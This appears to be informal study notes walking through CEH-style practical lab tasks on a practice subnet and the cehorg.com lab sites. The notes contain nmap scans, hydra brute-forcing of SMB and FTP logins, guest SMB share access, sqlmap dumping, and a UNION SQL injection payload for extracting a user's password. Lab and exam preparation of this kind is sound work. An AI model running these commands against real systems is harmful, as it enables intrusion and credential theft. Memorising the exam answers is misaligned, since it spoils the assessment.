xploit Investigation: Investigate a compromised Windows web development environment, scan the network, enumerate services, and find the IP address of a server running WampServer.

nmap -p 80,443 --script=http-enum 192.168.0.0/24
how to find answer
(This scans the subnet for HTTP services.
Identify WampServer:
Look for signatures or service banners indicating "WampServer".)

*Identify a Machine with SMB Service Enabled and Crack SMB Credentials*

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.0.0/24
hydra -L userlist.txt -P passlist.txt smb://192.168.0.10
Replace userlist.txt and passlist.txt with the appropriate username and password files.
Access SMB Share to Get the File:

smbclient //192.168.0.10/shared -U Henry
Decrypt the Encoded Secret:

Use the password to decrypt the encoded file (e.g., with openssl or gpg).

#Exploit Weak Credentials for FTP Service on a Windows Machine#
nmap -p 21 192.168.0.0/24 --open -sV
Look for the IP address where the FTP service is running
Replace <target_IP> with the IP address found in the nmap scan.
hydra -L userlist.txt -P passlist.txt ftp://<target_IP>


Scan for FTP Service:

Use nmap to scan the 192.168.0.0/24 subnet to find a machine running FTP (port 21).

-> nmap -p 21 192.168.0.0/24 --open -sV

Look for the IP address where the FTP service is running.

Use hydra to brute-force the FTP credentials. Create a list of potential usernames and passwords or use a commonly available list (e.g., rockyou.txt).

-> hydra -L userlist.txt -P passlist.txt ftp://<target_IP>

-> ftp <target_IP>
->get Credentials.txt
->cat Credentials.txt

$Exploiting a Web Application to Find a Flag$
curl -X GET "http://www.cehorg.com?page_id=84"
This command will return the contents of the page with page_id=84. You may modify the page_id parameter to test different values and observe changes in the response.


If the page_id parameter is vulnerable to SQL injection:

sqlmap -u "http://www.cehorg.com?page_id=84" --batch --dump

task 19 A disgruntled ex-employee has hidden a server access code in a Windows machine in the 192.168.0.0/24 subnet. You cannot physically access the target machine, but you know that the organization uses it for administration purposes.

Identify the target machine:

Use nmap to scan the subnet and identify the Windows machine.
Example command:
bash
Copy code
nmap -p 445 --open -sS 192.168.0.0/24
Look for a host with port 445 open (indicating SMB).
Access the machine via SMB:

Once you identify the IP address, connect to the machine using the smbclient tool.
Example command:
bash
Copy code
smbclient -L \\192.168.0.X -U guest
If you find shared directories, connect to the one where the file might be located.
Example:
bash
Copy code
smbclient \\\\192.168.0.X\\share_name -U guest
Search for the sa_code.txt file:

Navigate through the shared directories and search for sa_code.txt.
Example commands:
bash
Copy code
cd path/to/directory
ls
Download and read the file:

Once you locate the sa_code.txt file, download it.
Example command:
bash
Copy code
get sa_code.txt
Open the file to retrieve the server access code.
Example:
bash
Copy code
cat sa_code.txt
Submit the string in the file as the answer.

Question 12: SQL Injection Attack
Task: Perform an SQL injection attack on the target web application cinema.cehorg.com to extract the password of a user named Sarah. You already have credentials for another user, Karen, with the password "computer".

Steps:

Understand SQL Injection: SQL injection involves inserting or "injecting" a malicious SQL query via the input data from the client to the application. A successful attack can read sensitive data from the database, modify database data, execute administration operations, and sometimes even gain administrative access to the server.

Access the Web Application:

Open a web browser on your Parrot OS.
Go to cinema.cehorg.com.
Login with Existing Credentials:

Use the credentials Karen/computer to log in. This step helps to understand the application's structure and find possible injection points.
Identify Potential Injection Points:

Look for input fields, such as search boxes, login forms, or URL parameters, where user input might directly interact with the database.
For example, a URL like http://cinema.cehorg.com/movie.php?id=2 might be vulnerable if it directly inserts id into a SQL query.
Test for SQL Injection Vulnerability:

Start with simple payloads like ' OR '1'='1 or '-- to see if the application behaves unexpectedly.
If the application returns different data or an error, it may be vulnerable to SQL injection.
Craft SQL Injection Payload to Extract Data:

To extract Sarah's password, you might try a payload like:
vbnet
Copy code
' OR 1=1 UNION SELECT username, password FROM users WHERE username='Sarah'--
Inject this payload into a vulnerable input field or URL parameter.
Analyze the Output:

If successful, the response should include the password for Sarah.
Question 13: Exploit the Web Application
Task: Exploit the web application available at www.cehorg.com and enter the flag’s value at the page with page_id=84.

Steps:

Access the Target Web Application:

Navigate to www.cehorg.com using your browser.
Navigate to the Specific Page:

Go to the page with the URL http://www.cehorg.com/?page_id=84.
Identify Vulnerabilities:

Inspect the page source and look for clues that might indicate how to submit or exploit the page.
Common vulnerabilities include reflected XSS, SQL injection, file inclusion, or command injection.
Submit the Flag:

If there is a text input field or form, you may need to submit the correct flag. This flag could be extracted from another vulnerable point on the site or using tools like Burp Suite to intercept and modify traffic.
Important Notes:
Ethical Considerations: Only perform these actions in a legal and authorized environment. Unauthorized access to computer systems is illegal.
